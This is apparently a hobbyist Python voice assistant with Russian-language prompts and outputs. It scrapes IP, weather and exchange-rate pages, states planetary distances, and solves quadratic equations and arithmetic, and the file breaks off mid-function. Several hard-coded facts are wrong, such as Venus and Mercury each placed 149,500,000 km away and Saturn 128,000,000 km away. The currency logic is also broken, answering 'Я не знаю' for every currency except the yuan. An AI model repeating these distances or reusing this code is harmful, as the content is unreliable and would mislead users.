# -*- coding: utf-8 -*-
import os
import time
import random
import requests
from bs4 import BeautifulSoup
from datetime import date
from math import sqrt
from translate import Translator
import wikipedia
from termcolor import cprint

def SPEAK(words):
    print(words)
    list_words = []
    for i in words.lower():
        if i == '-' or i == '!' or i == '?' or i == ',' or i == '.' or i == '0' or i == '1' or i == '2' or i == '3' or i == '4' or i == '5' or i == '6' or i == '7' \
                or i == '8' or i == '9' or i == 'а' or i == '.' or i == ',' or i == ' ' or i == 'a' or i == 'б' \
                or i == 'в' or i == 'г' or i == 'д' or i == 'е' or i == 'ё' or i == 'ж' or i == 'з' or i == 'и' \
                or i == 'й' or i == 'к' or i == 'л' or i == 'м' or i == 'н' or i == 'о' or i == 'п' or i == 'р' \
                or i == 'с' or i == 'т' or i == 'у' or i == 'ф' or i == 'ч' or i == 'ц' or i == 'ч' or i == 'ш' \
                or i == 'щ' or i == 'ъ' or i == 'ы' or i == 'ь' or i == 'э' or i == 'ю' or i == 'я' or i == 'a' \
                or i == 'b' or i == 'c' or i == 'd' or i == 'e' or i == 'f' or i == 'g' or i == 'h' or i == 'i' \
                or i == 'j' or i == 'k' or i == 'l' or i == 'm' or i == 'n' or i == 'o' or i == 'p' or i == 'q' \
                or i == 'r' or i == 's' or i == 't' or i == 'u' or i == 'v' or i == 'w' or i == 'x' or i == 'y' \
                or i == 'z':
            list_words.append(i)

    words = ''.join(list_words)
    os.system("say " + words)

def yandex_ip():
    url = 'https://yandex.ru/internet/'

    sourse = requests.get(url)

    main_text = sourse.text

    soup = BeautifulSoup(main_text, features='lxml')

    IP = soup.find('li', class_='parameter-wrapper general-info__parameter')
    IP = IP.text[10:]
    print('IP:', IP)

    city = soup.find('div', class_='location-renderer__value')
    city = city.text
    def IPGEO():
        ipgeo = 'https://api.hackertarget.com/geoip/?q=' + IP
        info = requests.get(ipgeo)
        print(info.text)
    IPGEO()
    return IP


def weather_rambler():
    t = int((time.ctime(time.time()))[11:-11])

    url = 'https://weather.rambler.ru/vo-vladivostoke/today/'
    list = []
    sourse = requests.get(url)
    main_text = sourse.text

    soup = BeautifulSoup(main_text, features='lxml')

    table = soup.findAll('span', {'class': '_3ImX'})
    for i in table:
        list.append(i.text)

    if 6 <= t <= 8:
        weater = list[1]
    elif 9 <= t <= 17:
        weater = list[2]
    elif 18 <= t <= 21:
        weater = list[3]
    else:
        weater = list[0]
    if weater[0] == '-':
        minus = 'минус '
    else:
        minus = ''
    print('На улице ' + weater)
    if weater[0] == '-':
        weater = int(weater[1:-1])
    else:
        weater = int(weater[:-1])
    if weater % 10 == 1 and weater % 100 != 11:
        weater = str(weater) + ' градус'
    elif weater % 10 in [2, 3, 4] and weater % 100 not in [12, 13, 14]:
        weater = str(weater) + ' градуса'
    elif weater % 10 == 0 or weater % 10 in [5, 6, 7, 8, 9] or weater % 100 in [11, 12, 13, 14]:
        weater = str(weater) + ' градусов'
    return minus, weater

def Exchange_Rates():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]

    url = 'https://www.cbr.ru/currency_base/daily/'

    sourse = requests.get(url)
    main_text = sourse.text

    soup = BeautifulSoup(main_text, features='lxml')
    list = []
    table = soup.find('table', {'class': 'data'})
    trr = table.findAll('tr')
    line = soup.find('table', {'class': 'data'}).findAll('td')
    for i in line:
        list.append(i.text)
    AUD = str(round((float('.'.join(list[4].split(','))) / int(list[(2)])), 4))  #
    AZN = str(round((float('.'.join(list[9].split(','))) / int(list[(7)])), 4))  #
    AMD = str(round((float('.'.join(list[14].split(','))) / int(list[(12)])), 4))  #
    BYN = str(round((float('.'.join(list[19].split(','))) / int(list[(17)])), 4))  #

    BGN = str(round((float('.'.join(list[24].split(','))) / int(list[(22)])), 4))  #
    BRL = str(round((float('.'.join(list[29].split(','))) / int(list[(27)])), 4))
    HUF = str(round((float('.'.join(list[34].split(','))) / int(list[(32)])), 4))
    KRW = str(round((float('.'.join(list[39].split(','))) / int(list[(37)])), 4))

    HKD = str(round((float('.'.join(list[44].split(','))) / int(list[(42)])), 4))
    DKK = str(round((float('.'.join(list[49].split(','))) / int(list[(47)])), 4))
    USD = str(round((float('.'.join(list[54].split(','))) / int(list[(52)])), 4))  #
    EUR = str(round((float('.'.join(list[59].split(','))) / int(list[(57)])), 4))  #

    INR = str(round((float('.'.join(list[64].split(','))) / int(list[(62)])), 4))
    KZT = str(round((float('.'.join(list[69].split(','))) / int(list[(67)])), 4))
    CAD = str(round((float('.'.join(list[74].split(','))) / int(list[(72)])), 4))
    KGS = str(round((float('.'.join(list[79].split(','))) / int(list[(77)])), 4))

    CNY = str(round((float('.'.join(list[84].split(','))) / int(list[(82)])), 4))  #
    MDL = str(round((float('.'.join(list[89].split(','))) / int(list[(87)])), 4))
    TMT = str(round((float('.'.join(list[94].split(','))) / int(list[(92)])), 4))
    NOK = str(round((float('.'.join(list[99].split(','))) / int(list[(97)])), 4))

    PLN = str(round((float('.'.join(list[104].split(','))) / int(list[(102)])), 4))
    RON = str(round((float('.'.join(list[109].split(','))) / int(list[(107)])), 4))
    XDR = str(round((float('.'.join(list[114].split(','))) / int(list[(112)])), 4))
    SGD = str(round((float('.'.join(list[119].split(','))) / int(list[(117)])), 4))

    TJS = str(round((float('.'.join(list[124].split(','))) / int(list[(122)])), 4))
    TRY = str(round((float('.'.join(list[129].split(','))) / int(list[(127)])), 4))
    UZS = str(round((float('.'.join(list[134].split(','))) / int(list[(132)])), 4))
    UAH = str(round((float('.'.join(list[139].split(','))) / int(list[(137)])), 4))

    GBP = str(round((float('.'.join(list[144].split(','))) / int(list[(142)])), 4))
    CZK = str(round((float('.'.join(list[149].split(','))) / int(list[(147)])), 4))
    SEK = str(round((float('.'.join(list[154].split(','))) / int(list[(152)])), 4))
    CHF = str(round((float('.'.join(list[159].split(','))) / int(list[(157)])), 4))

    ZAR = str(round((float('.'.join(list[164].split(','))) / int(list[(162)])), 4))
    JPY = str(round((float('.'.join(list[169].split(','))) / int(list[(167)])), 4))

    if mess.find('доллар') != -1 or (mess.find('доллара') != -1 and mess.find('курс') != -1):
        if mess.find('австрал') != -1:
            mess = AUD

        elif mess.find('гонконг') != -1:
            mess = HKD

        elif mess.find('канад') != -1:
            mess = CAD

        elif mess.find('сингапур') != -1:
            mess = SGD
        else:
            mess = USD


    if mess.find('лей') != -1 or (mess.find('лея') != -1 and mess.find('курс') != -1):
        if mess.find('молдав') != -1:
            mess = MDL

        elif mess.find('румын') != -1:
            mess = RON

    if mess.find('манат') != -1 or (mess.find('маната') != -1 and mess.find('курс') != -1):
        if mess.find('айзерба') != -1:
            mess = AZN

        elif mess.find('туркмен') != -1:
            mess = TMT


    if mess.find('лев') != -1 or (mess.find('льва') != -1 and mess.find('курс') != -1):
        if mess.find('болгар') != -1:
            mess = BGN

    if mess.find('рубль') != -1 or (mess.find('рубля') != -1 and mess.find('курс') != -1):
        if mess.find('белорусс') != -1:
            mess = BYN

    if mess.find('рупий') != -1 or (mess.find('рупия') != -1 and mess.find('курс') != -1):
        mess = INR

    if mess.find('крона') != -1 or (mess.find('кроны') != -1 and mess.find('курс') != -1):
        if mess.find('датс') != -1:
            mess = DKK

        elif mess.find('норвеж') != -1:
            mess = NOK

        elif mess.find('чеш') != -1:
            mess = CZK

        elif mess.find('швед') != -1:
            mess = SEK

    if mess.find('тенге') != -1 or (mess.find('тенгея') != -1 and mess.find('курс') != -1):
        mess = KZT


    if mess.find('реал') != -1 or (mess.find('реала') != -1 and mess.find('курс') != -1):
        mess = BRL

    if mess.find('евро') != -1 or (mess.find('евра') != -1 and mess.find('курс') != -1):
        mess = EUR


    if mess.find('иен') != -1 or (mess.find('иена') != -1 and mess.find('курс') != -1):
        mess = JPY


    if mess.find('рэнд') != -1 or (mess.find('рэнда') != -1 and mess.find('курс') != -1):
        mess = ZAR


    if mess.find('франк') != -1 or (mess.find('франка') != -1 and mess.find('курс') != -1):
        mess = CHF


    if mess.find('фунт') != -1 or (mess.find('фунта') != -1 and mess.find('курс') != -1):
        mess = GBP

    if mess.find('гривна') != -1 or (mess.find('гривны') != -1 and mess.find('курс') != -1):
        mess = UAH

    if mess.find('лира') != -1 or (mess.find('лиры') != -1 and mess.find('курс') != -1):
        if mess.find('турец') != -1:
            mess = TRY

    if mess.find('сомон') != -1 or (mess.find('сомона') != -1 and mess.find('курс') != -1):
        mess = TJS

    if mess.find('СДР') != -1 or (mess.find('СДР') != -1 and mess.find('курс') != -1):
        mess = XDR

    if mess.find('злотый') != -1 or (mess.find('злотыя') != -1 and mess.find('курс') != -1):
        mess = PLN

    if mess.find('сом') != -1 or (mess.find('сома') != -1 and mess.find('курс') != -1):
        mess = KGS

    if mess.find('сум') != -1 or (mess.find('сума') != -1 and mess.find('курс') != -1):
        mess = UZS

    if mess.find('форинт') != -1 or (mess.find('флоринта') != -1 and mess.find('курс') != -1):
        mess = HUF

    if mess.find('вон') != -1 or (mess.find('вона') != -1 and mess.find('курс') != -1):
        mess = KRW

    if mess.find('юань') != -1 or (mess.find('юаня') != -1 and mess.find('курс') != -1):
        mess = CNY
    else:
        return 'Я не знаю'
    print(mess)
    mess_volute = int(str(round(float(mess),0))[:-2])
    if mess_volute == 0:
        massiv = mess.split('.')
        massiv.insert(1, ' точка ')
        massiv.insert(1, ' целых')
        if len(massiv[3]) == 1:
            massiv.insert(3, ' десятых')
        if len(massiv[3]) == 2:
            massiv.insert(3, ' сотых')
        if len(massiv[3]) == 3:
            massiv.insert(3, ' тысячных')
        if len(massiv[3]) == 4:
            massiv.insert(4, ' десяти тысячных')
        mess_volute = ''.join(massiv)
        if mess_volute[0] == '-':
            mess_volute = 'минус ' + mess_volute[1:]
        text_speak = str(mess_volute) + ' рубля'
        return text_speak
    else:
        if mess_volute % 10 == 1 and mess_volute % 100 != 11:
            text_speak = str(mess_volute) + ' рубль'
            return text_speak
        elif mess_volute % 10 in [2, 3, 4] and mess_volute % 100 not in [12, 13, 14]:
            text_speak = str(mess_volute) + ' рубля'
            return text_speak
        elif mess_volute % 10 == 0 or mess_volute % 10 in [5, 6, 7, 8, 9] or mess_volute % 100 in [11, 12, 13, 14]:
            text_speak = str(mess_volute) + ' рублей'
            return text_speak
        else:
            text_speak = str(mess_volute) + ' руб'
            return text_speak

def now_time():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    if mess.find('день') != -1 or mess.find('дата') != -1:
        if date.today().month == 1:
            date_month = 'Января'
        if date.today().month == 2:
            date_month = 'Февраля'
        if date.today().month == 3:
            date_month = 'Марта'
        if date.today().month == 4:
            date_month = 'Апреля'
        if date.today().month == 5:
            date_month = 'Мая'
        if date.today().month == 6:
            date_month = 'Июня'
        if date.today().month == 7:
            date_month = 'Июля'
        if date.today().month == 8:
            date_month = 'Августа'
        if date.today().month == 9:
            date_month = 'Сентября'
        if date.today().month == 10:
            date_month = 'Октября'
        if date.today().month == 11:
            date_month = 'Ноября'
        if date.today().month == 12:
            date_month = 'Декабря'
        print(date.today().day, date_month, date.today().year, 'год')
        return str(date.today().day) + date_month
    else:
        print(time.ctime(time.time())[11:-5])
        hour_now = time.ctime(time.time())[11:-11]
        minutes_now = time.ctime(time.time())[14:-8]
        seconds_now = time.ctime(time.time())[17:-5]
        if mess.find('секунд') != -1:
            return (hour_now + 'часов' + minutes_now + 'минут' + seconds_now + 'секунд')
        else:
            return (hour_now + 'часов' + minutes_now + 'минут')

def distance_from_earth():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    if mess.find('луны') != -1 or mess.find('луна') != -1:
        if mess.find('до') != -1:
            print('До Луны 384 400 км')
            return('380000 км')

    if mess.find('солнца') != -1 or mess.find('солнце') != -1:
        if mess.find('до') != -1:
            print('До Солнца 149 600 000 км')
            return('150000000 км')

    if mess.find('марса') != -1 or mess.find('марс') != -1:
        if mess.find('до') != -1:
            print('До Марса 225 000 000 км')
            return('225000000 км')

    if mess.find('юпитера') != -1 or mess.find('юпитер') != -1:
        if mess.find('до') != -1:
            print('До Юпитера 778 547 200 км')
            return('770000000 км')

    if mess.find('венеры') != -1 or mess.find('венера') != -1:
        if mess.find('до') != -1:
            print('До Венеры 149 500 000 км')
            return('150000000 км')

    if mess.find('меркурия') != -1 or mess.find('меркурий') != -1:
        if mess.find('до') != -1:
            print('До Меркурия 149 500 000 км')
            return('150000000 км')

    if mess.find('сатурна') != -1 or mess.find('сатурн') != -1:
        if mess.find('до') != -1:
            print('До Сатурна 128 000 000 км')
            return('128000000 км')

    if mess.find('нептуна') != -1 or mess.find('нептун') != -1:
        if mess.find('до') != -1:
            print('До Нептуна 4 450 000 000 км')
            return('4500000000 км')

    if mess.find('урана') != -1 or mess.find('уран') != -1:
        if mess.find('до') != -1:
            print('До Урана 2 875 000 000 км')
            return('2900000000 км')

    if mess.find('плутона') != -1 or mess.find('плутон') != -1:
        if mess.find('до') != -1:
            print('До Плутона 5 700 000 000 км')
            return('5700000000 км')

    if mess.find('бетельгейзе') != -1 or mess.find('бетельгейза') != -1:
        if mess.find('до') != -1:
            print('До Бетельгейзе 693 419 955 373.2749 км')
            return('700000000000 км')

    if mess.find('земли') != -1 or mess.find('земля') != -1:
        if mess.find('до') != -1:
            print('Это шутка?')
            return('Сэр. Я не знаю')


def to_horizon():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    if mess.find('земли') != -1 or mess.find('земле') != -1 or mess.find('земля') != -1:
        R = 6371
        h = input('Введите высоту над уровнем моря: ')
        sign = h[-2:]
        sign2 = h[-1]
        if sign == 'км' or sign == 'km':
            h = int(h[:-2])
        elif sign2 == 'м' or sign2 == 'm':
            h = int(h[:-1]) / 1000

        l = sqrt(2 * R * h)
        result = 'l равно ' + str(round(l)) + ' км равно ' + str(round(l * 1000)) + ' м'
        return result
    else:
        print('l = √2Rh')
        Planet = input('\nНа какой вы планете: ').lower()
        if Planet.find('земле') != -1 or Planet.find('земля') != -1 or Planet.find('земли') != -1:
            R = 6371
        elif Planet.find('марсе') != -1 or Planet.find('марс') != -1 or Planet.find('марса') != -1:
            R = 3389.5
        elif Planet.find('солнце') != -1 or Planet.find('солнца') != -1:
            R = 695510
        elif Planet.find('юпитере') != -1 or Planet.find('юпитер') != -1 or Planet.find('юпитера') != -1:
            R = 69911
        elif Planet.find('луне') != -1 or Planet.find('луна') != -1 or Planet.find('луны') != -1:
            R = 1737.1
        elif Planet.find('сатурне') != -1 or Planet.find('сатурн') != -1 or Planet.find('сатурна') != -1:
            R = 58232
        elif Planet.find('уране') != -1 or Planet.find('уран') != -1 or Planet.find('урана') != -1:
            R = 25362
        elif Planet.find('венере') != -1 or Planet.find('венера') != -1 or Planet.find('венеры') != -1:
            R = 6051.8
        elif Planet.find('меркурие') != -1 or Planet.find('меркурий') != -1 or Planet.find('меркурия') != -1:
            R = 2439.7
        elif Planet.find('непруне') != -1 or Planet.find('нептун') != -1 or Planet.find('нептуна') != -1:
            R = 24622
        elif Planet.find('плутоне') != -1 or Planet.find('плутон') != -1 or Planet.find('плутона') != -1:
            R = 1188.3
        else:
            R = float(input('Введите радиус объекта на котором вы стоите: '))
        print('R =', R, 'км')
        h = input('Введите высоту над уровнем моря: ')
        sign = h[-2:]
        sign2 = h[-1]
        if sign == 'км' or sign == 'km':
            h = int(h[:-2])
        elif sign2 == 'м' or sign2 == 'm':
            h = int(h[:-1]) / 1000

        l = sqrt(2 * R * h)
        result = 'l равно ' + str(round(l)) + ' км равно ' + str(round(l * 1000)) + ' м'
        return result


def quadratic_equation():
    print('a * x² + b * x + c = 0')
    a = int(input('a: '))
    b = int(input('b: '))
    c = int(input('c: '))
    if a != 0 and b != 0 and c != 0:
        if a == 0:
            return 'Это не квадратное уравнение'
        if b < 0:
            bs = '(' + str(b) + ')'
        else:
            bs = ''
        D = b * b - 4 * a * c
        print('D = b² - 4 * a * c = ⋅⋅⋅ \n              ⋅⋅⋅ = ', bs, '² - 4 * ', a, ' * ', c, ' = ', D,
              sep='')
        if D < 0:
            return 'У. Уравнения нет корней'
        if D > 0:
            x1 = (-b - sqrt(D)) / (2 * a)
            if (len(str(x1).split('.')[1])) > 3:
                about_x1 = ' ≈ ' + str(round(x1, 3))
                about_x1_talk = str(about_x1[3:])

                if type(round(x1, 3)) == float:
                    massiv = about_x1_talk.split('.')
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    about_x1_talk = ''.join(massiv)

                if about_x1_talk[0] == '-':
                    about_x1_talk = 'минус ' + about_x1_talk[1:]
            else:
                about_x1 = ''
                about_x1_talk = str(x1)
                massiv = about_x1_talk.split('.')
                if massiv[1] == '0':
                    about_x1_talk = about_x1_talk[:-2]
                else:
                    if type(x1) == float:
                        massiv.insert(1, ' точка ')
                        if len(massiv[2]) == 1:
                            massiv.insert(3, ' десятых')
                        if len(massiv[2]) == 2:
                            massiv.insert(3, ' сотых')
                        if len(massiv[2]) == 3:
                            massiv.insert(3, ' тысячных')
                        about_x1_talk = ''.join(massiv)
                if about_x1_talk[0] == '-':
                    about_x1_talk = 'минус ' + about_x1_talk[1:]

            x2 = (-b + sqrt(D)) / (2 * a)
            if (len(str(x2).split('.')[1])) > 3:
                about_x2 = ' ≈ ' + str(round(x2, 3))
                about_x2_talk = str(about_x2[3:])
                if type(round(x2, 3)) == float:
                    massiv = about_x2_talk.split('.')
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    about_x2_talk = ''.join(massiv)
                if about_x2_talk[0] == '-':
                    about_x2_talk = 'минус ' + about_x2_talk[1:]
            else:
                about_x2 = ''
                about_x2_talk = str(x2)
                massiv = about_x2_talk.split('.')
                if massiv[1] == '0':
                    about_x2_talk = about_x2_talk[:-2]
                else:
                    if type(x2) == float:
                        massiv.insert(1, ' точка ')
                        if len(massiv[2]) == 1:
                            massiv.insert(3, ' десятых')
                        if len(massiv[2]) == 2:
                            massiv.insert(3, ' сотых')
                        if len(massiv[2]) == 3:
                            massiv.insert(3, ' тысячных')
                        about_x2_talk = ''.join(massiv)
                if about_x2_talk[0] == '-':
                    about_x2_talk = 'минус ' + about_x2_talk[1:]
            print('\n      -b + √D     ', -b, ' + √', D, '\nx₁ = --------- = ',
                  '-' * (len(str(-b)) + len(str(D)) + 6), ' = ', x1, about_x1,
                  '\n        2 * a  ', ' ' * int(((len(str(-b)) + len(str(D)) + 3) / 2)), '2 * ', a, '\n',
                  sep='')
            print('\n      -b - √D     ', -b, ' - √', D, '\nx₂ = --------- = ',
                  '-' * (len(str(-b)) + len(str(D)) + 6), ' = ', x2, about_x2,
                  '\n        2 * a  ', ' ' * int(((len(str(-b)) + len(str(D)) + 3) / 2)), '2 * ', a, '\n',
                  sep='')
            return ('x первый равен ' + str(about_x1_talk)) + ('x второй равен ' + str(about_x2_talk))
        if D == 0:
            x = -b / (2 * a)
            print('x = -b / (2 * a) =', x)
            about_x_talk = str(x)
            massiv = about_x_talk.split('.')
            if massiv[1] == '0':
                about_x_talk = about_x_talk[:-2]
            else:
                if type(x) == float:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    about_x_talk = ''.join(massiv)
            if about_x_talk[0] == '-':
                about_x_talk = 'минус ' + about_x_talk[1:]
            return ('x равен ' + about_x_talk)
    elif b == 0 and c == 0:
        print(a, ' * x² = 0\n\
x = 0', sep='')
        return 'x, равен нулю'

    elif c == 0:
        x2 = -b / a
        print(a, ' * x² + ', b, ' * x = 0\nx₁ = 0      ', a, ' * x₂ + ', b, ' = 0\n', a, ' * x₂ = ', -b,
              '\nx₂ = ', -b, ' / ', a, ' = ', x2, sep='')
        return('x первый равен нулю') + (', x второй равен' + str(x2))
    elif b == 0:

        ca = round(c / a)
        if ca < 0:
            print('Это не квадратное уравнение')
            return('Это не квадратное уравнение')
            exit(0)
        x1 = sqrt(ca)
        if (len(str(x1).split('.')[1])) > 3:
            about_x1 = ' ≈ ' + str(round(x1, 3))
            about_x1_talk = str(about_x1[3:])
            if type(round(x1, 3)) == float:
                massiv = about_x1_talk.split('.')
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                about_x1_talk = ''.join(massiv)
            if about_x1_talk[0] == '-':
                about_x1_talk = 'минус ' + about_x1_talk[1:]
        else:
            about_x1 = ''
            about_x1_talk = str(x1)
            massiv = about_x1_talk.split('.')
            if massiv[1] == '0':
                about_x1_talk = about_x1_talk[:-2]
            else:
                if type(x1) == float:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    about_x1_talk = ''.join(massiv)
            if about_x1_talk[0] == '-':
                about_x1_talk = 'минус ' + about_x1_talk[1:]

        x2 = -sqrt(ca)
        if (len(str(x2).split('.')[1])) > 3:
            about_x2 = ' ≈ ' + str(round(x2, 3))
            about_x2_talk = str(about_x2[3:])
            if type(round(x2, 3)) == float:
                massiv = about_x2_talk.split('.')
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                about_x2_talk = ''.join(massiv)
            if about_x2_talk[0] == '-':
                about_x2_talk = 'минус ' + about_x2_talk[1:]
        else:
            about_x2 = ''
            about_x2_talk = str(x2)
            massiv = about_x1_talk.split('.')
            if massiv[1] == '0':
                about_x2_talk = about_x2_talk[:-2]
            else:
                if type(x2) == float:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    about_x2_talk = ''.join(massiv)
            if about_x2_talk[0] == '-':
                about_x2_talk = 'минус ' + about_x2_talk[1:]
        print(a, ' * x² + ', c, ' = 0\n', a, ' * x² = ', -c, '\nx² = ', -c, '/', a, '\nx₁ = √', -c, '/', a,
              ' = ', x1, about_x1, '\nx₂ = -√', -c, '/', a, ' = ', x2, about_x2, sep='')
        return('x первый равен' + about_x1_talk) + (', x второй равен' + about_x2_talk)


def MULTIPLICATION():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    mess_operation = mess.split(' ')
    if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[0])) * (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            multiplication_talk = str(result_multiplication)
            massiv = multiplication_talk.split('.')
            if massiv[1] == '0':
                multiplication_talk = multiplication_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                multiplication_talk = ''.join(massiv)
            if multiplication_talk[0] == '-':
                multiplication_talk = 'минус ' + multiplication_talk[1:]
        return(multiplication_talk)
    if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[1])) * (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            multiplication_talk = str(result_multiplication)
            massiv = multiplication_talk.split('.')
            if massiv[1] == '0':
                multiplication_talk = multiplication_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                multiplication_talk = ''.join(massiv)
            if multiplication_talk[0] == '-':
                multiplication_talk = 'минус ' + multiplication_talk[1:]
        return(multiplication_talk)

def DIVIDE():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    mess_operation = mess.split(' ')
    if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[0])) / (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            division_talk = str(result_multiplication)
            massiv = division_talk.split('.')
            if massiv[1] == '0':
                division_talk = division_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                division_talk = ''.join(massiv)
            if division_talk[0] == '-':
                division_talk = 'минус ' + division_talk[1:]
        return(str(division_talk))
    if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[1])) / (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            division_talk = str(result_multiplication)
            massiv = division_talk.split('.')
            if massiv[1] == '0':
                division_talk = division_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                division_talk = ''.join(massiv)
            if division_talk[0] == '-':
                division_talk = 'минус ' + division_talk[1:]
        return(division_talk)


def ADDITION():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    mess_operation = mess.split(' ')
    if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[0])) + (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            division_talk = str(result_multiplication)
            massiv = division_talk.split('.')
            if massiv[1] == '0':
                division_talk = division_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                division_talk = ''.join(massiv)
            if division_talk[0] == '-':
                division_talk = 'минус ' + division_talk[1:]
        return (str(division_talk))
    if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[1])) + (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            division_talk = str(result_multiplication)
            massiv = division_talk.split('.')
            if massiv[1] == '0':
                division_talk = division_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                division_talk = ''.join(massiv)
            if division_talk[0] == '-':
                division_talk = 'минус ' + division_talk[1:]
        return(division_talk)


def SUBTRACTION():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    mess_operation = mess.split(' ')
    if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[0])) - (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            division_talk = str(result_multiplication)
            massiv = division_talk.split('.')
            if massiv[1] == '0':
                division_talk = division_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                division_talk = ''.join(massiv)
            if division_talk[0] == '-':
                division_talk = 'минус ' + division_talk[1:]
        return(str(division_talk))
    if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
        result_multiplication = (float(mess_operation[1])) - (float(mess_operation[-1]))
        print('{0:,}'.format(result_multiplication).replace(',', ' '))
        if type(result_multiplication) == float:
            result_multiplication = round(result_multiplication, 3)
            division_talk = str(result_multiplication)
            massiv = division_talk.split('.')
            if massiv[1] == '0':
                division_talk = division_talk[:-2]
            else:
                massiv.insert(1, ' точка ')
                if len(massiv[2]) == 1:
                    massiv.insert(3, ' десятых')
                if len(massiv[2]) == 2:
                    massiv.insert(3, ' сотых')
                if len(massiv[2]) == 3:
                    massiv.insert(3, ' тысячных')
                division_talk = ''.join(massiv)
            if division_talk[0] == '-':
